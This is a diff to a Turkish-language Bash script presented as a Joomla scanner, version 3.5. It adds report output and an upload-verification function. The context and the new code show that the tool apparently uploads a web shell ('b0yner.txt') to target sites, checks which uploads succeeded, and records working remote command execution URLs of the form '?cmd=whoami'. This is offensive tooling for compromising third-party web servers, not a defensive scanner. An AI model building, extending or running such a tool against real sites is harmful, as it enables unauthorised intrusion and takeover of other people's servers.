@@ -16,11 +16,20 @@ CYAN='\033[0;36m'
 NC='\033[0m'
 
 # Değişkenler
-TARGET="${1}"
-SCRIPT_VERSION="3.1"
+SCRIPT_VERSION="3.5"
 SCRIPT_NAME="Joomla V${SCRIPT_VERSION} Scanner"
 PAYLOAD_FILE="b0yner.txt"
 GITHUB_RAW_URL="https://raw.githubusercontent.com/Dx3iZ/Joomla/refs/heads/main/joom.sh"
+REPORT_FILE="joom_rapor_$(date '+%Y%m%d_%H%M%S').txt"
+
+while getopts "o:" opt; do
+    case $opt in
+        o) REPORT_FILE="$OPTARG" ;;
+        \?) exit 1 ;;
+    esac
+done
+shift $((OPTIND-1))
+TARGET="${1}"
 check_update() {
     echo -e "  ${BLUE}[*]${NC} Guncelleme kontrol ediliyor..."
     LATEST_SCRIPT=$(curl -s --connect-timeout 5 --max-time 10 "$GITHUB_RAW_URL" 2>/dev/null)
@@ -49,6 +58,19 @@ declare -a RCE_SHELLS
 DETECTED="false"
 VERSION="Bulunamadi"
 
+verify_upload() {
+    local method="$1"
+    local check_url="$2"
+    local check_resp=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 "$check_url" 2>/dev/null)
+    if [ "$check_resp" = "200" ]; then
+        echo -e "    ${GREEN}[✔]${NC} Yukleme basarili: $method"
+        upload_success+=("${method}|${check_url}")
+    else
+        echo -e "    ${YELLOW}[-]${NC} Yukleme basarisiz: $method (HTTP $check_resp)"
+    fi
+    upload_count=$((upload_count + 1))
+}
+
 # Banner
 echo ""
 echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
@@ -59,8 +81,8 @@ echo ""
 
 # Arguman kontrolu
 if [ -z "$TARGET" ]; then
-    echo -e "  ${RED}[!]${NC} Kullanim: $0 <hedef_url>"
-    echo -e "  ${YELLOW}[*]${NC} Ornek: $0 https://www.ornek-site.com"
+    echo -e "  ${RED}[!]${NC} Kullanim: $0 [-o rapor_dosyasi.txt] <hedef_url>"
+    echo -e "  ${YELLOW}[*]${NC} Ornek: $0 -o rapor.txt https://www.ornek-site.com"
     exit 1
 fi
 
@@ -790,6 +812,37 @@ if [ "$RCE_FOUND" = true ]; then
     echo -e "  ${YELLOW}[!]${NC} NOT: Shell dosyasi 'b0yner.txt' olarak yuklendi."
 fi
 
+{
+    echo "========================================="
+    echo "Joomla Scanner V${SCRIPT_VERSION} - Tarama Raporu"
+    echo "========================================="
+    echo "Hedef: $TARGET"
+    echo "Tarih: $(date '+%Y-%m-%d %H:%M:%S')"
+    echo "Joomla Tespiti: $DETECTED"
+    echo "Joomla Versiyonu: $VERSION"
+    echo "Guvenlik Aciklari: $VULN_COUNT adet"
+    echo "Basarili Yukleme: ${#upload_success[@]} adet (${upload_count} denemeden)"
+    echo "RCE Basarili: $RCE_FOUND"
+    echo "SQLi Tespiti: $SQLI_FOUND"
+    echo ""
+    if [ "$RCE_FOUND" = true ]; then
+        echo "RCE Shell'leri:"
+        for shell in "${RCE_SHELLS[@]}"; do
+            echo "  - $shell?cmd=whoami"
+        done
+        echo ""
+    fi
+    if [ ${#upload_success[@]} -gt 0 ]; then
+        echo "Basarili Yuklemeler:"
+        for entry in "${upload_success[@]}"; do
+            IFS='|' read -r method url <<< "$entry"
+            echo "  - $method -> $url"
+        done
+        echo ""
+    fi
+} > "$REPORT_FILE"
+
+echo -e "  ${GREEN}[✔]${NC} Rapor kaydedildi: $REPORT_FILE"
 echo ""
 echo -e "  ${BLUE}[*]${NC} Islem tamamlandi: $(date '+%Y-%m-%d %H:%M:%S')"
 echo ""
